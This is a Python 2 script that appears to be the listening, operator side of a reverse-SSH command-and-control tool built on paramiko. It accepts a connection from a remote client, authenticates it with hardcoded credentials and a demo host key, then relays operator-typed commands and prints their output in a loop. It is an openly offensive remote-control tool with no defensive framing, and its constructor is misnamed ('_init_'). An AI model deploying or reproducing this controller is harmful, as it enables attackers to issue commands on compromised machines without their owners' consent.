#!/usr/bin/python

import socket
import paramiko
import threading
import sys
from termcolor import colored as c

# Use key from paramiko demo files
host_key = paramiko.RSAKey(filename='test_rsa.key')

class Server (paramiko.ServerInterface):
    def _init_(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == 'ssh_dummy') and (password == 'sshdummy1'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
server = sys.argv[1]
ssh_port = int(sys.argv[2])
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((server, ssh_port))
    s.listen(100)
    print c("[+] Listening for ssh connection...","green")
    client, addr = s.accept()
except Exception, e:
    print c("[!] Listen failed" + str(e),"white","on_red")
    sys.exit(1)
print c("[+] Got a connection!","white","on_green")

try:
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(host_key)
    server = Server()
    try:
        bhSession.start_server(server=server)
    except paramiko.SSHException, x:
        print c("[!] SSH negotiation failed","white","on_red")
    chan = bhSession.accept(20)
    print c("[+] Authenticated!","white","on_green")
    print chan.recv(1024)
    chan.send("Welcome to fox_ssh")
    while True:
        try:
            command = raw_input("Enter command: ").strip("\n")
            if command != "exit":
                chan.send(command)
                print chan.recv(1024) + "\n"
            else:
                chan.send("exit")
                print "Exiting"
                bhSession.close()
                raise Exception ("exit")
        except KeyboardInterrupt:
            bhSession.close()
except Exception, e:
    print c("[!] Caught exception: " + str(e),"white","on_red")
    try:
        bhSession.close()
    except:
        pass
    sys.exit(1)